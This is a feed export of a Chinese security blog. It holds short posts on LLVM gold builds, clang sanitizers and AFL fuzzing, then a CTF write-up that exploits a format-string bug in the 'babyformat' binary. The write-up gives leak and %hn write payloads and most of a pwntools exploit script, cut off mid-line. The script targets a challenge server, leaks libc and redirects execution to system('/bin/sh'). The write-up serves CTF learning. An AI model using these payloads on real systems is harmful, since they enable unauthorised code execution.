    <content type="html"><![CDATA[<p>之前一直想了解OS的流程，直到在逛github的时候看到<a href="https://github.com/cfenollosa/os-tutorial" target="_blank" rel="noopener">os-tutorial</a>，这是一个比较适合小白了解OS，并手动构建一个OS的项目，先在此mark一下，此项目还在持续更新中~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直想了解OS的流程，直到在逛github的时候看到&lt;a href=&quot;https://github.com/cfenollosa/os-tutorial&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;os-tutorial&lt;/a&gt;，这是一个比较适合小白
    
    </summary>
    
    
      <category term="OS" scheme="http://bin2415.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>llvm gold build</title>
    <link href="http://bin2415.github.io/2018/09/27/llvm-gold/"/>
    <id>http://bin2415.github.io/2018/09/27/llvm-gold/</id>
    <published>2018-09-27T11:30:17.000Z</published>
    <updated>2018-12-23T05:33:53.016Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Binutils-Building"><a href="#Binutils-Building" class="headerlink" title="Binutils Building"></a>Binutils Building</h3><h4 id="Download-binutils-source-code"><a href="#Download-binutils-source-code" class="headerlink" title="Download binutils source code"></a>Download binutils source code</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth 1 git://sourceware.org/git/binutils-gdb.git binutils</span><br></pre></td></tr></table></figure>
<h4 id="Build-binutils"><a href="#Build-binutils" class="headerlink" title="Build binutils"></a>Build binutils</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../binutils/configure --enable-gold --enable-plugins --disable-werror</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="LLVMgold-so-build"><a href="#LLVMgold-so-build" class="headerlink" title="LLVMgold.so build"></a>LLVMgold.so build</h3><h4 id="Download-LLVM-source-code"><a href="#Download-LLVM-source-code" class="headerlink" title="Download LLVM source code"></a>Download LLVM source code</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/llvm-mirror/llvm.git</span><br></pre></td></tr></table></figure>
<h4 id="Build-LLVM-with-gold-plugin"><a href="#Build-LLVM-with-gold-plugin" class="headerlink" title="Build LLVM with gold-plugin"></a>Build LLVM with gold-plugin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ../llvm -DLLVM_BINUTILS_INCDIR=&quot;path/to/binutils/include&quot;</span><br><span class="line">make -j($nproc)</span><br></pre></td></tr></table></figure>
<p>And the LLVMgold.so will appear in the lib folder.</p>
<h4 id="Copy"><a href="#Copy" class="headerlink" title="Copy"></a>Copy</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo cp lib/LLVMgold.so /usr/local/lib</span><br><span class="line">sudo mkdir /usr/lib/bfd-plugins</span><br><span class="line">sudo cp lib/LLVMgold.so /usr/lib/bfd-plugins</span><br><span class="line">sudo cp lib/libLTO.so /usr/lib/bfd-plugins</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Binutils-Building&quot;&gt;&lt;a href=&quot;#Binutils-Building&quot; class=&quot;headerlink&quot; title=&quot;Binutils Building&quot;&gt;&lt;/a&gt;Binutils Building&lt;/h3&gt;&lt;h4 id=&quot;Downl
    
    </summary>
    
    
      <category term="llvm" scheme="http://bin2415.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>LLVM添加sanitizer</title>
    <link href="http://bin2415.github.io/2018/08/28/add-sanitizer/"/>
    <id>http://bin2415.github.io/2018/08/28/add-sanitizer/</id>
    <published>2018-08-28T08:24:13.000Z</published>
    <updated>2018-12-23T05:33:52.999Z</updated>
    
    <content type="html"><![CDATA[<p>有的时候需要在编译器LLVM上添加自己写的sanitizer，比如自己写的sanitizer名字叫做Bitype，想通过指定-fsanitize=bitype来开启Bitype sanitizer，则需要如下步骤:</p>
<ul>
<li>在clang/Basic/Sanitizers.def文件中添加SANITIZER(“bitype”, Bitype)</li>
<li>在clang/Driver/SanitizerArgs.h中添加needsBitypeRt函数</li>
<li>在clang/lib/Deriver/ToolChain.cpp文件中getSupportedSanitizers()函数添加Res对Bitype的支持</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有的时候需要在编译器LLVM上添加自己写的sanitizer，比如自己写的sanitizer名字叫做Bitype，想通过指定-fsanitize=bitype来开启Bitype sanitizer，则需要如下步骤:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在clang/Basic/San
    
    </summary>
    
      <category term="llvm" scheme="http://bin2415.github.io/categories/llvm/"/>
    
    
      <category term="llvm" scheme="http://bin2415.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>afl fork server</title>
    <link href="http://bin2415.github.io/2018/08/06/afl-fork-server/"/>
    <id>http://bin2415.github.io/2018/08/06/afl-fork-server/</id>
    <published>2018-08-06T12:25:14.000Z</published>
    <updated>2018-12-23T05:33:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>fuzz解析数据的库函数的方法一般是找一个简单的二进制来测试库函数的功能，通过生成不同的输入来不断地运行该二进制程序。一般是通过fork和execve来生成子进程运行目标二进制程序，fuzz程序通过waitpid()函数来等待子进程退出，如果子进程发出SIGSEGV或SIGABORT等信号，则证明子进程崩溃了，此时可能会发生了memory corruption bugs。然而没有一个输入，就调用ececve()函数来进行程序的链接，库函数的初始化等操作，大大地降低了fuzzing的效率[1]。AFL通过在目标程序中插入fork server的逻辑代码来保证在fuzzing的时候只进行一次程序的链接，库函数的初始化等操作，而通过fork()函数的copy-on-write机制，大大提高了fuzzing的效率。</p>
<h2 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h2><p>通过在二进制程序中插入fork server代码，该fork server会在main函数之前执行，它会暂停，等待AFL fuzzing端的输入，当AFL fuzzing端”发号施令”给fork server之后，fork server此时就通过fork()函数来生成子进程，子进程继续main函数的逻辑，由于fork server已经将各种资源都加载好，所以每次子进程只需要执行main函数的代码即可。</p>
<p><img src="/2018/08/06/afl-fork-server/./fork-server.png" alt="fork-server"></p>
<p>上面的例子是在afl中的llvm_mode文件夹中的afl-llvm-rt.o.c文件中定义的，fork server的逻辑也是比较简单，一个while循环，从FORKSRV_FD文件中读取AFL端给传来的数据，其中FORKSRV_FD是一个管道的一端，负责从AFL端读取数据。如果AFL端传来数据，则证明此时AFL的输入已准备好，则可以通过fork()来生成一个子进程，来运行main函数，进行fuzzing。</p>
<p>由于AFL进程与要fuzzing的进程不是父子关系(AFL与fork server是父子关系，fork server与要fuzzing的进程是父子关系)。所以AFL通过管道与fork server进程进行通信，而fork server通过waitpid()函数等待要fuzzing的子进程完成，得到其退出是的状态status，并将status通过管道传给AFL进程。</p>
<p>其中在afl-fuzz.c中的init_forkserver函数中，是对管道进行的初始化，感兴趣的可以看一下。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ol>
<li>Fuzzing random programs without execve(). <a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html" target="_blank" rel="noopener">https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;fuzz解析数据的库函数的方法一般是找一个简单的二进制来测试库函数的功能，通过生成不同的输入来不断地运行该二进制程序。一般是通过fork和e
    
    </summary>
    
      <category term="fuzzing" scheme="http://bin2415.github.io/categories/fuzzing/"/>
    
    
      <category term="afl" scheme="http://bin2415.github.io/tags/afl/"/>
    
      <category term="fuzzing" scheme="http://bin2415.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>AFL Fuzzing with ASAN</title>
    <link href="http://bin2415.github.io/2018/07/31/afl-asan/"/>
    <id>http://bin2415.github.io/2018/07/31/afl-asan/</id>
    <published>2018-07-31T03:05:45.000Z</published>
    <updated>2018-12-23T05:33:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">AFL</a>是使用比较广泛的fuzzing工具，ASAN(<a href="https://github.com/google/sanitizers/wiki/AddressSanitizer" target="_blank" rel="noopener">AddressSanitizer</a>)是google的一个非常高效的内存错误检测工具，其能够检查出UAF,Heap/Stack buffer overflow, Use after return, Use after scope, Initialization order bugs and Memory leaks。这两者都有基于llvm的版本，所以将这两者相结合效果也是非常好的。</p>
<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>在用AFL和ASAN来fuzzing heartbleed(教程链接<a href="https://github.com/ThalesIgnite/afl-training/tree/master/challenges/heartbleed" target="_blank" rel="noopener">afl-training</a>)的时候出现了一个问题:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Since it seems to be built with ASAN and you have a</span><br><span class="line">    restrictive memory limit configured, this is expected; please read</span><br><span class="line">    /usr/local/share/doc/afl/notes_for_asan.txt for help</span><br></pre></td></tr></table></figure>
<p>这是因为ASAN工具是跟踪所有内存的，所以理论上可能需要的内存比较大，在32位系统中，最多占用800多MB内存。在64位系统中，ASAN的shadow memory的理论上占用的最大内存是17.5TB和20TB，而一般的电脑并没有这么大的内存，所以可能会使电脑死机。所以AFL会在64位机器运行64位程序的时候，报出这种错误。<a href="https://github.com/mirrorer/afl/blob/master/docs/notes_for_asan.txt" target="_blank" rel="noopener">链接</a>也提供了这种情况的解决方法。</p>
<p>实际上，以上最大内存只是理论上的，一般运行的程序shadow memory所占用的内存并没有这么多，所以第一种解决方法就是使用-m none选项，来忽略此错误:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out -m none ./executable</span><br></pre></td></tr></table></figure>
<p>第二种方法就是使用cgroup来限定改程序使用的资源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ~/afl/experimental/asan_cgroups/limit_memory.sh -u usename afl-fuzz -i in -o out -m none ./executable</span><br></pre></td></tr></table></figure>
<p>第二种方法是比较稳妥的方法，并不会对系统造成非常大的影响，因为其限定了程序所使用的内存资源。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ol>
<li>AFL: <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a></li>
<li>ASAN: <a href="https://github.com/google/sanitizers/wiki/AddressSanitizer" target="_blank" rel="noopener">https://github.com/google/sanitizers/wiki/AddressSanitizer</a></li>
<li>afl-training: <a href="https://github.com/ThalesIgnite/afl-training/tree/master/challenges/heartbleed" target="_blank" rel="noopener">https://github.com/ThalesIgnite/afl-training/tree/master/challenges/heartbleed</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/afl/&quot; target=&quot;_blank&quot; rel=&quot;noopene
    
    </summary>
    
      <category term="fuzzing" scheme="http://bin2415.github.io/categories/fuzzing/"/>
    
    
      <category term="fuzzing" scheme="http://bin2415.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>记一次Format String的利用(格式化字符串不在栈上)</title>
    <link href="http://bin2415.github.io/2018/07/29/format-string/"/>
    <id>http://bin2415.github.io/2018/07/29/format-string/</id>
    <published>2018-07-29T06:50:37.000Z</published>
    <updated>2018-12-23T05:33:53.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天做了一个CTF的题目，该题目的二进制<a href="./babyformat">链接</a>。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。</p>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><blockquote>
<p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">参考</a>。</p>
</blockquote>
<p>一般发生格式化字符串漏洞的原因是因为并没有指定第一个参数格式化字符串(或者格式化字符串可以更改)，所以给了攻击者一个可以控制格式化字符串的机会，进而可以实现任意的内存读写能力。其中能触发格式化字符串漏洞的函数有如下几个: scanf, printf, vprintf, vfprintf, sprintf, vsprintf, vsnprintf, setproctitle, syslog等，如果想比较系统的了解格式化字符串漏洞，可以访问<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">链接</a>。</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先拿到程序，先分析一下该程序的保护措施:</p>
<p><img src="/2018/07/29/format-string/./security.png" alt="security"></p>
<p>发现其除了canary保护之外，其它防护都开了(主要是输入的buff并不在栈上，所以并没有canary保护，并不代表着可以通过buffer overflow来溢出返回地址-_-)。</p>
<p>然后扔给IDA pro分析其逻辑:</p>
<p><img src="/2018/07/29/format-string/./code.png" alt="code"></p>
<p>该程序的逻辑非常简单，首先是给你三次机会，让你进行格式化字符串攻击，COUNT是全局变量，COUNT=3。接下来是exploit_me函数，该函数的逻辑更加简单，现将BUFF变量清空，然后读入13个字节，再将输入的字符串输出，在输出的时候会发生格式化字符串的攻击。其中BUFF是一个全局变量，大小是16个字节。该程序攻击起来主要有如下几个难点:</p>
<ul>
<li>由于输入的长度有限(只有13个字节)，并且只允许进行三次尝试</li>
<li>格式化字符串不在栈上，进行任意内存的读写存在一定的难度</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来主要针对以上提出来的两个难点进行攻击。</p>
<h3 id="修改计数变量"><a href="#修改计数变量" class="headerlink" title="修改计数变量"></a>修改计数变量</h3><p>由于只允许三次输入，并且输入的长度有限，很难进行有效的攻击，所以接下来思路就是首先利用这三次输入将控制输入的计数变量修改掉，使其能够进行多次输入。</p>
<p>有上面程序分析可以看到，计数变量有两个：MACRO_COUNT局部变量和COUNT全局变量，只要将其中一个值修改掉，就可以进行多次输入，方便进行接下来的攻击。所以现在思路主要如下：</p>
<ul>
<li>泄露地址：包括栈的地址和程序的地址。</li>
<li>修改栈的内容：保证栈中有MACRO_COUNT或者COUNT的地址。</li>
<li>修改MACRO_COUNT或者COUNT的值。</li>
</ul>
<p>以上的每一个目的都可以利用一次format string攻击实现。</p>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p><img src="/2018/07/29/format-string/./stack.png" alt="stack"></p>
<p>上面该图是在printf调用前的栈的内容，可以看出第一个参数是格式化字符串的地址，而接下来的一个内存单元0xffffcf6c存储的也是格式化字符串的地址，所以可以通过泄露该内存单元的内容来泄露BUFF变量的地址，从而可以算出程序的基址。接下来，ebp的内存单元存储的是saved ebp，上一个函数的ebp值，该值是栈的地址，所以可以通过泄露该地址来泄露栈的地址。所以可以输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%p%6$p</span><br></pre></td></tr></table></figure>
<p>来泄露栈的地址和程序的地址。</p>
<h4 id="修改栈的内容"><a href="#修改栈的内容" class="headerlink" title="修改栈的内容"></a>修改栈的内容</h4><p>由于格式化字符串不在栈上，所以想通过格式化字符串来修改某个内存单元的值，首先得先把该内存的地址写入栈中。通过上面分析我们知道了栈上的地址和程序的地址，通过偏移也能计算出MACRO_COUNT和COUNT的地址。接下来则需要将MACRO_COUNT或者COUNT的地址写入栈中。在此，我选择将MACRO_COUNT的地址写入到栈中，理由如下:</p>
<p><img src="/2018/07/29/format-string/./macro_count.png" alt="macro count"></p>
<p>从上图可以看到0xffffcf84地址处存储的是内存单元0xffffd044的地址，而0xffffd044存储的值是0xffffd224，也是栈上的一个地址，而MACRO_COUNT也是栈上的变量，其地址与0xffffd224的高16位应该是相等的，所以此时只需要修改0xffffd044地址存储的低16位即可。这样能保证攻击顺利进行（如果修改整个32位的话，则输出的数太多，需要花费很长时间，还有一个原因是导致输入的字符串过长，没办法实现攻击）。</p>
<p>所以具体的攻击手段就是将0xffffd044内存单元存储的值的低16位改为MACRO_COUNT的高位byte地址即可。</p>
<p>假设MACRO_COUNT的地址为addr。<br>则可以输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&quot; + str(addr &amp; 0xffff) + &quot;d&quot; + &quot;%9$hn&quot;</span><br></pre></td></tr></table></figure>
<p>即可。</p>
<h4 id="修改MACRO-COUNT的值"><a href="#修改MACRO-COUNT的值" class="headerlink" title="修改MACRO_COUNT的值"></a>修改MACRO_COUNT的值</h4><p>通过前面的步骤，实现了将0xffffd224的地址处存储了MACRO_COUNT的地址，而0xffffd044相对于0xffffcf60(printf的第一个参数)的offset为0xE4,则可以进行如下输入使的MACRO_COUNT的高位为0xFF。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%255d%57$hhn&quot;</span><br></pre></td></tr></table></figure>
<p>其中57为0xE4/4，因为地址是4字节的。</p>
<h3 id="读写任意内存"><a href="#读写任意内存" class="headerlink" title="读写任意内存"></a>读写任意内存</h3><p>通过以上的努力，我们可以进行多次的输入。由于输入的格式化字符串是全局变量，并不在栈上，我们就不能通过一次简单的输入就能读写任意内存，此时需要通过格式化字符串来间接的修改内存地址到栈上。具体思路如下：</p>
<p>如果我想要将地址addr写入到栈上的某个内存单元上去，设栈上的该内存单元地址为stack_addr。则我需要一次中介来完成此类攻击。</p>
<p>我们再来看一下调用printf时栈中的布局：</p>
<p><img src="/2018/07/29/format-string/./write_everywhere.png" alt="write_everywhere"></p>
<p>可以看到0xffffcf84和0xffffcf88两个内存单元存储的内容是栈上的地址，而其又指向了一个栈上的地址。所以可以通过格式化字符串将0xffffd044地址处的内容改为stack_addr+2，将0xffffd04c地址处的内容改为stack_addr，然后再通过$hn分别向stack_addr+2处写入addr的高16位((addr&amp;0xffff0000)&gt;&gt;16)，stack_addr处写入addr的低16位(addr&amp;0xffff)。</p>
<p>具体的攻击过程如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(address, modifiedAddress)</span>:</span></span><br><span class="line">    print(<span class="string">"modified address is %x"</span> % modifiedAddress)</span><br><span class="line">    <span class="comment">#puts_got_run = puts_got + binary_base</span></span><br><span class="line">    modifiedAddress_high = (modifiedAddress &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="comment">#log.info("strcmp got run high %x " % strncmp_got_run_high)</span></span><br><span class="line">    modifiedAddress_low = modifiedAddress &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    temp_low = (address + <span class="number">0x2</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp low is %x"</span> % temp_low)</span><br><span class="line">    payload3 = <span class="string">"%"</span>+str(temp_low) + <span class="string">"d"</span> + <span class="string">"%9$hn"</span></span><br><span class="line">    p.sendline(payload3)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    temp_high = (address) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp high is %x"</span> % temp_high)</span><br><span class="line">    payload4 = <span class="string">"%"</span> + str(temp_high) + <span class="string">"d"</span> + <span class="string">"%10$hn"</span></span><br><span class="line">    p.sendline(payload4)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload5 = <span class="string">"%"</span> + str(modifiedAddress_high)+<span class="string">"d"</span> + <span class="string">"%57$hn"</span></span><br><span class="line">    print(<span class="string">"got run high is %x "</span> % (modifiedAddress_high))</span><br><span class="line">    p.sendline(payload5)</span><br><span class="line">    <span class="comment"># p.recv()</span></span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload6 = <span class="string">"%"</span> + str(modifiedAddress_low)+<span class="string">"d"</span>+<span class="string">"%59$hn"</span></span><br><span class="line">    print(<span class="string">"got run low is %x "</span> % (modifiedAddress_low))</span><br><span class="line">    p.sendline(payload6)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>其中address就是此处的stack_addr，modifiedAddress就是此处的addr。</p>
<p>有了可以向栈中写入任意地址的能力，我们就可以进行libc地址的泄露和修改返回地址及其参数了。</p>
<h4 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h4><p>通过以上的方法，我们可以将printf函数的got地址写入到栈上，然后通过%s读取got的内容，从而泄露libc的地址。<br>由于改题目并没有提供具体的libc版本，所以可以通过泄露的printf的地址，到<a href="https://libc.blukat.me/" target="_blank" rel="noopener">libc database search</a>网站进行查询。通过绣楼libc地址，我们可以得到system的地址和”/bin/sh”字符串的地址。</p>
<h4 id="修改返回地址和参数"><a href="#修改返回地址和参数" class="headerlink" title="修改返回地址和参数"></a>修改返回地址和参数</h4><p>由于泄露了libc的地址，所以将main函数的返回地址修改为system的地址，并将其参数设为”/bin/sh”字符串的地址，输入EXIT，即可完成攻击。</p>
<p>整个的攻击脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(address, modifiedAddress)</span>:</span></span><br><span class="line">    print(<span class="string">"modified address is %x"</span> % modifiedAddress)</span><br><span class="line">    <span class="comment">#puts_got_run = puts_got + binary_base</span></span><br><span class="line">    modifiedAddress_high = (modifiedAddress &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="comment">#log.info("strcmp got run high %x " % strncmp_got_run_high)</span></span><br><span class="line">    modifiedAddress_low = modifiedAddress &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    temp_low = (address + <span class="number">0x2</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp low is %x"</span> % temp_low)</span><br><span class="line">    payload3 = <span class="string">"%"</span>+str(temp_low) + <span class="string">"d"</span> + <span class="string">"%9$hn"</span></span><br><span class="line">    p.sendline(payload3)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    temp_high = (address) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp high is %x"</span> % temp_high)</span><br><span class="line">    payload4 = <span class="string">"%"</span> + str(temp_high) + <span class="string">"d"</span> + <span class="string">"%10$hn"</span></span><br><span class="line">    p.sendline(payload4)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload5 = <span class="string">"%"</span> + str(modifiedAddress_high)+<span class="string">"d"</span> + <span class="string">"%57$hn"</span></span><br><span class="line">    print(<span class="string">"got run high is %x "</span> % (modifiedAddress_high))</span><br><span class="line">    p.sendline(payload5)</span><br><span class="line">    <span class="comment"># p.recv()</span></span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload6 = <span class="string">"%"</span> + str(modifiedAddress_low)+<span class="string">"d"</span>+<span class="string">"%59$hn"</span></span><br><span class="line">    print(<span class="string">"got run low is %x "</span> % (modifiedAddress_low))</span><br><span class="line">    p.sendline(payload6)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./babyformat')</span></span><br><span class="line">pp = ELF(<span class="string">'./babyformat'</span>)</span><br><span class="line">p = remote(<span class="string">'104.196.99.62'</span>, port = <span class="number">2222</span>)</span><br><span class="line">p.recvuntil(<span class="string">'==== Baby Format - Echo system ===='</span>)</span><br><span class="line"></span><br><span class="line">puts_got = pp.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># puts_offset = 0x5fca0</span></span><br><span class="line"><span class="comment"># bin_sh_offset = 0x15ba0b</span></span><br><span class="line"><span class="comment"># system_offset = 0x3ada0</span></span><br><span class="line">system_offset = <span class="number">0x3cd10</span></span><br><span class="line">puts_offset = <span class="number">0x67360</span></span><br><span class="line">bin_sh_offset = <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## leak address</span></span><br><span class="line">p.sendline(<span class="string">'%p%6$p'</span>)</span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">p.recvline()</span><br><span class="line">leaked = p.recvline()</span><br><span class="line">addr_buff = int(leaked[<span class="number">2</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">binary_base = addr_buff - <span class="number">0x202c</span> </span><br><span class="line">log.info(<span class="string">"BUFF address is %x"</span> % addr_buff)</span><br><span class="line">addr_stack_ebp = int(leaked[<span class="number">12</span>:<span class="number">20</span>], <span class="number">16</span>) - <span class="number">0x20</span></span><br><span 